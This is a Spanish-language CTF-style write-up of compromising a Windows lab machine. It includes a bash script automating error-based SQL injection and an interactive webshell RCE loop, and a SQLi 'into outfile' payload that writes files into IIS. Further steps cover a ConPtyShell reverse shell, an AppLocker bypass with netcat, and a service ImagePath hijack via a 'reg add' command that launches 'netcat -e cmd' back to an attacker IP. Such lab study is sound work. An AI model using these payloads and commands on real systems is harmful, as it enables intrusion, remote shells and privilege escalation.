---------
- Tags: #sqli #bash-scripting #windows #winpeas #image-path #hijacking #conptyshell #scriptblocks
-----------
## Tecnicas utilizadas

- SQL Injection [SQLI] - Error Based  
- Advanced Bash Scripting (EXTRA)  
- SQLI to RCE (Into Outfile - PHP File Creation)  
- ConPtyShell (Fully Interactive Reverse Shell for Windows)  
- Playing with ScriptBlocks and PSCredential to execute commands as another user  
- AppLocker Bypass  
- WinPEAS Enumeration  
- Service ImagePath Hijacking (Privilege Escalation)

## Procedimiento

![[Pasted image 20230613114216.png]]


Comenzamos con el escaneo en nmap y nos muestra los siguientes puertos:

![[Pasted image 20230613152008.png]]

Haciendo un whatweb para ver las tecnologias que corren por detras en la pagina web vemos lo siguiente:

![[Pasted image 20230613152029.png]]

En la pagina principal, no vemos gran cosa, pero hay una boton que nos manda a la ruta de *admin*. Si la visitamos, vemos que no podemos visualizar nada porque nos pide una cabecera que no sabemos cual es:

![[Pasted image 20230613152120.png]]

Podemos hacer brute force a la cabecera con **Wfuzz** y usando un diccionario del seclists que contenga cabeceras comunes:

![[Pasted image 20230613152705.png]]

Vemos que no sucede nada con ninguna cabecera, todas nos regresan los mismos caracteres, las mismas palabras y el mismo codigo de estado, sin embargo, el el codigo fuente de la pagina vemos que hay una *IP*. Si intentamos fuzzear las cabeceras pasando como argumento esa *IP* vemos que hay una que si regresa algo.

Con burpsuite, podemos implementar una nueva cabecera e ir a la pagina para ver el contenido de la pagina. En la pagina, hay un *browser*, si colocamos una *''*  vemos que nos lanza un error de syntaxys de SQL. Podemos aprovecharnos de SQLi para dumpear la base de datos por la informacion que nos interese.

--------------------------------
#### SQL Injection [SQLI] - Error Based  

Podemos automatizar la inyecion sql en **bash** o **python**, de modo de ejemplo se usara a continuacion **bash**:
```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n${yellowColour}[!]${endColour}${redColour} Saliendo...!${endColour}"
	exit 1
}

# ctrl + c
trap ctrl_c INT

# Variables globares

# Paleta de colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function makeQuery(){
	myQuery="$1"
	echo; curl -s -X POST "http://<ip>/<path>.php" -H "X-forwarded-For: ip" -d "productName=$myQuery" | awk '/<tbody>/,/<\/tbody>/' | html2text | sed 's/1|//' | sed 's/| 3| 4| 5| 6//'
}

function makeInteractive(){
	while [ "$myQuery" != "exit" ]; do
		echo -ne "${yellowColour}~${endColour} ${grayColou}Injection >${endColour} " && read -r myQuery
		echo; curl -s -X POST "http://<ip>/<path>.php" -H "X-forwarded-For: ip" -d "productName=$myQuery" | awk '/<tbody>/,/<\/tbody>/' | html2text | sed 's/1|//' | sed 's/| 3| 4| 5| 6//'
	done
}

function rceInteractive(){
	while [ "$myCommand" != "exit" ]; do
		echo -ne "${yellowColour}~${endColour} ${grayColou}RCE >${endColour} " && read -r myCommand
		echo; curl -s -X GET -G "http://<ip>/pwned.php" --data-urlencode "cmd=$myCommand"
	done
}

function helpPanel(){
	echo -e "\n${yellowColour}[?]${endColour} ${grayColour}Uso:${endColour}\n"
	echo -e "\t${turquoiseColour}q)${endColour} ${grayColour}Query a probar${endColour} ${purpleColor}[Ej. -q \"' union select 1,2,3,4,5,6-- -\"]${endColour}"
	echo -e "\t${turquoiseColour}i)${endColour} ${grayColour}Modo interactivo${endColour}"
	echo -e "\t${turquoiseColour}e)${endColour} ${grayColour}Modo interactivo[RCE]${endColour}"
	echo -e "\t${turquoiseColour}h)${endColour} ${grayColour}Mostrar este panel de ayuda${endColour}"
	exit 1
}

declare -i parameter_counter=0 
while getopts "q:ieh" arg; do
	case $arg in
		q) myQuery=$OPTARG;let parameter_counter+=1;;
		i) let parameter_counter+=2;;
		e) let parameter_counter+=3;;
		h) helpPanel;;
	esac
done

#./sqli.sh -q "' union select 1,2,3,4,5,6-- -"

if [ $parameter_counter -eq 1 ]; then
	makeQuery "$myQuery"
elif [ $parameter_counter -eq 2 ]; then
	makeInteractive
elif [ $parameter_counter -eq 3 ]; then
	rceInteractive
else
	helpPanel
fi

```
-------
#### SQLI to RCE (Into Outfile - PHP File Creation)  

Encontramos hashes en la base de datos de mysql de algunos usuarios, podemos intentar creakearlos con **crackstations** de manera offline. Podemos ver algunas contraseñas, pero no las podemos utilizar para nada, ya que los servicios de **smb** y **evil-winrm** no estan corriendo actualmente en la maquina. Lo que podemos interntar es cargar un archivo malicioso a la ruta del *IIS* para establecer una *webshell*. La ruta seria la siguiente:

`C:\inetpub\wwwroot\prueba.txt`

La menera de introduccir un archivo a la ruta del *IIS* seria la siguiente:

`' union select 1,"probando",2,3,4,5,6 into outfile "C:\\inetpub\\wwwroot\\prueba.txt"-- -`

----------------
#### ConPtyShell (Fully Interactive Reverse Shell for Windows) 

Podemos entablarnos una conexion por tcp por el repositorio de *AntonioCoco/ConPtyShell* Tenemos que descargar el script que nos señala y procesarlo en la maquina victima. Podemos ahorrarnos el importarlo a la maquina y despues invocarlo sin el script llamamos a la misma funcion.

--------------
#### Playing with ScriptBlocks and PSCredential to execute commands as another user

A continuacion, podemos hacer lo siguiente:

1. Crear un usuario -> $user = 'fidelity\\hector'
2. Crear una contraseña -> $password = ConvertTo-SecureString 'Password' -AsPlainText -Force
3. Crear una credencial -> $cred = New-Object System.Management.Automation.PScredential $user, $password

Ya con esto podemos ejecutar comandos como *hector* de la siguiente manera:

`invoke-command -ComputerName localhost -Cred $cred -ScriptBlock { $command }`

------------
#### AppLocker Bypass  

Podemos abusar del listado que nos brinda el repositorio para subir un archivo y que no nos lo impidan. Aqui mismo podemos subir *netcat* y mandarnos una revershell a nuestra maquina como el usuario *Hector*.

-------------
#### WinPEAS Enumeration 

Subimos el binario de WinPeas en busca de vias potenciales de escalar nuestro privilegio. Y encontramos que tenemos **FULL CONTROL** sobre todos los servicios, esto quiere decir que podemos parar e iniciar servicios, asi como manipular sus parametros.

--------------
#### Service ImagePath Hijacking (Privilege Escalation)

Para listar los parametros del servicio, podemos hacer el siguiente comando

`reg query HKLM\System\CurrentControlSet\Services\<services>`

Para manipuar algun atributo del servicio podemos hacer

`reg add HKLM\System\CurrentControlSet\Services\<services> /t REG_EXPAND_SZ /v <atributo> /d "<route-netcat> -e cmd <ip> <port> " /f`

y posteriormente:

`sc start <service>`











